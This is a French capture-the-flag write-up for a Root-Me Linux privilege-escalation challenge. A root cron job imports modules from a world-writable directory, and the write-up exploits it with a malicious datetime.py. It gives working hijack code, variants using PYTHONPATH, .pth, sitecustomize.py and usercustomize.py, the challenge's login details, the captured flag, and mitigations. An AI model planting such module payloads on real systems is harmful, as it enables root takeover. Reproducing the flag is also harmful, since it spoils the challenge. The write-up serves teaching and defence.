# Linux Privesc - Module Hijacking (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32356
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32356
```

---

## Objectif

Un script Python surveille les connexions TCP sur le système. Analyser et exploiter cette configuration pour lire `/root/flag.txt`.

---

## Reconnaissance

### Analyse du script Python

```bash
user@challenge:~$ cat /opt/backup_tool/tcp_monitor.py
#!/usr/bin/env python3
import os
import time
import socket
import subprocess
import datetime
import glob
import sys

REPORTS_DIR = "/root/reports"
MAX_REPORTS = 5

def ensure_reports_dir():
    if not os.path.exists(REPORTS_DIR):
        os.makedirs(REPORTS_DIR)

def get_tcp_sockets():
    result = subprocess.run(["/usr/bin/ss", "-tlnp"], capture_output=True, text=True, check=True)
    return result.stdout

def main():
    ensure_reports_dir()
    tcp_data = get_tcp_sockets()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    # ... écrit le rapport

if __name__ == "__main__":
    main()
```

### Vérification des permissions du répertoire

```bash
user@challenge:~$ ls -la /opt/backup_tool/
total 12
drwxrwxrwx 2 root root 4096 Jul 13  2025 .     ← PERMISSIONS 777!
drwxr-xr-x 1 root root 4096 Jul 13  2025 ..
-rw-r--r-- 1 root root 2113 Jul 13  2025 tcp_monitor.py
```

### Vérification du cron job

```bash
user@challenge:~$ cat /etc/cron.d/tcp_monitor
* * * * * root cd /opt/backup_tool && python3 tcp_monitor.py > /dev/null 2>&1
```

### Analyse

| Élément | Valeur | Implication |
|---------|--------|-------------|
| Script | `/opt/backup_tool/tcp_monitor.py` | Importe datetime, os, etc. |
| Permissions | `drwxrwxrwx` (777) | Écriture pour tous |
| Exécution | Cron toutes les minutes | En tant que root |
| Répertoire de travail | `/opt/backup_tool` | Python cherche les modules ici en premier |

---

## Vulnérabilité : Python Module Hijacking

### Comment Python résout les imports

Quand Python exécute `import datetime`, il cherche le module dans cet ordre :

```
1. Répertoire du script en cours d'exécution  ← /opt/backup_tool/
2. PYTHONPATH (variable d'environnement)
3. Répertoires standards (site-packages, lib/)
```

### Le problème

```
/opt/backup_tool/
├── tcp_monitor.py    (import datetime)
└── [NOUS POUVONS ÉCRIRE ICI]

Si on crée datetime.py dans ce répertoire:
├── tcp_monitor.py    (import datetime)
└── datetime.py       ← NOTRE MODULE MALVEILLANT!

Python chargera NOTRE datetime.py au lieu du module standard!
```

---

## Exploitation

### Étape 1 : Créer le module malveillant

```bash
user@challenge:~$ cat > /opt/backup_tool/datetime.py << 'EOF'
import os
os.system("cat /root/flag.txt > /tmp/flag.out; chmod 777 /tmp/flag.out")

# Re-export original datetime for the script to work
import sys
del sys.modules["datetime"]
sys.path.remove("/opt/backup_tool")
from datetime import *
EOF
```

### Explication du code malveillant

```python
import os
os.system("cat /root/flag.txt > /tmp/flag.out; chmod 777 /tmp/flag.out")
# ↑ S'exécute dès l'import, avant le reste du script

# Re-export pour que le script original fonctionne:
import sys
del sys.modules["datetime"]           # Supprime notre module du cache
sys.path.remove("/opt/backup_tool")   # Retire le répertoire du chemin
from datetime import *                # Importe le vrai datetime
```

### Étape 2 : Vérifier la création

```bash
user@challenge:~$ ls -la /opt/backup_tool/
total 16
drwxrwxrwx 2 root root 4096 Feb 23 12:22 .
drwxr-xr-x 1 root root 4096 Jul 13  2025 ..
-rw-r--r-- 1 user user  198 Feb 23 12:22 datetime.py  ← Notre module
-rw-r--r-- 1 root root 2113 Jul 13  2025 tcp_monitor.py
```

### Étape 3 : Attendre l'exécution du cron (max 1 minute)

```bash
user@challenge:~$ sleep 60
```

### Étape 4 : Lire le flag

```bash
user@challenge:~$ cat /tmp/flag.out
RM{cf119ca1e836f5a108393dd52f52ae33}
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION VULNÉRABLE                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /opt/backup_tool/                                          │
│  ├── tcp_monitor.py  (exécuté par root via cron)           │
│  │   └── import datetime  ← Cherche datetime.py ici        │
│  │                                                          │
│  Permissions: drwxrwxrwx (777)                              │
│               └── Tout le monde peut écrire!                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    INJECTION DU MODULE                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Création de /opt/backup_tool/datetime.py                   │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ import os                                             │ │
│  │ os.system("cat /root/flag.txt > /tmp/flag.out")       │ │
│  │ # ... re-export le vrai datetime                      │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    EXÉCUTION PAR CRON                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Cron lance: python3 tcp_monitor.py (en tant que root)   │
│                                                             │
│  2. Python exécute: import datetime                         │
│     → Cherche dans /opt/backup_tool/ EN PREMIER             │
│     → Trouve datetime.py (notre module!)                    │
│                                                             │
│  3. Notre code s'exécute avec les droits ROOT:              │
│     os.system("cat /root/flag.txt > /tmp/flag.out")         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    FLAG CAPTURÉ                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /tmp/flag.out contient:                                    │
│  RM{cf119ca1e836f5a108393dd52f52ae33}                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{cf119ca1e836f5a108393dd52f52ae33}
```

---

## Ordre de résolution des imports Python

```python
import sys
print(sys.path)
```

Résultat typique :
```
[
    '',                           # Répertoire courant ou du script
    '/usr/lib/python3/dist-packages',
    '/usr/lib/python3.11',
    '/usr/lib/python3.11/lib-dynload',
    '/usr/local/lib/python3.11/dist-packages',
]
```

Le premier élément (répertoire du script) est toujours prioritaire !

---

## Modules couramment ciblés

| Module | Raison |
|--------|--------|
| `os` | Très courant, accès système |
| `sys` | Très courant |
| `datetime` | Très courant pour les logs |
| `subprocess` | Exécution de commandes |
| `json` | Parsing de données |
| `requests` | Requêtes HTTP |

### Alternative : Hijacking via PYTHONPATH

Si on peut contrôler la variable d'environnement :

```bash
export PYTHONPATH=/tmp/evil:$PYTHONPATH
echo "import os; os.system('id')" > /tmp/evil/datetime.py
python3 script.py
```

---

## Comment se protéger

### 1. Permissions correctes sur les répertoires de scripts

```bash
# MAUVAIS
drwxrwxrwx  /opt/backup_tool/

# BON
drwxr-xr-x  /opt/backup_tool/   # 755
chown root:root /opt/backup_tool/
```

### 2. Utiliser des chemins absolus pour Python

```bash
# Dans le cron, spécifier PYTHONPATH explicitement
PYTHONPATH=/usr/lib/python3 python3 /opt/backup_tool/script.py
```

### 3. Utiliser des environnements virtuels isolés

```bash
# Créer un venv
python3 -m venv /opt/backup_tool/venv
source /opt/backup_tool/venv/bin/activate
pip install -r requirements.txt

# Exécuter avec le venv
/opt/backup_tool/venv/bin/python3 /opt/backup_tool/script.py
```

### 4. Vérifier l'intégrité des modules

```python
import hashlib
import datetime

# Vérifier que datetime vient du bon endroit
expected_path = "/usr/lib/python3.11/datetime.py"
if datetime.__file__ != expected_path:
    raise SecurityError("Module hijacking detected!")
```

### 5. Utiliser sys.path de manière sécurisée

```python
import sys
# Retirer le répertoire courant du path
sys.path = [p for p in sys.path if p not in ('', '.')]
```

---

## Commandes utiles

```bash
# Voir le chemin de recherche des modules Python
python3 -c "import sys; print('\n'.join(sys.path))"

# Voir d'où vient un module
python3 -c "import datetime; print(datetime.__file__)"

# Trouver les répertoires avec permissions d'écriture
find /opt /usr/local -type d -perm -o+w 2>/dev/null

# Chercher les scripts Python exécutés par cron
grep -r "python" /etc/cron* 2>/dev/null

# Vérifier les permissions des répertoires de scripts
ls -la /opt/ /usr/local/bin/ /usr/local/sbin/
```

---

## Variantes d'attaque

### 1. Fichier .pth malveillant

Les fichiers `.pth` dans site-packages ajoutent des chemins au sys.path :

```bash
echo "/tmp/evil" > /usr/local/lib/python3.11/dist-packages/evil.pth
echo "import os; os.system('id')" > /tmp/evil/sitecustomize.py
```

### 2. sitecustomize.py

Ce fichier est automatiquement importé au démarrage de Python :

```bash
echo "import os; os.system('id')" > /usr/lib/python3.11/sitecustomize.py
```

### 3. usercustomize.py

Similaire mais dans le répertoire utilisateur :

```bash
echo "import os; os.system('id')" > ~/.local/lib/python3.11/usercustomize.py
```

---

## Ressources

- [Python sys.path documentation](https://docs.python.org/3/library/sys.html#sys.path)
- [OWASP - Python Security](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks - Python Path Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#python-library-hijacking)
- `man python3` - Options de ligne de commande Python
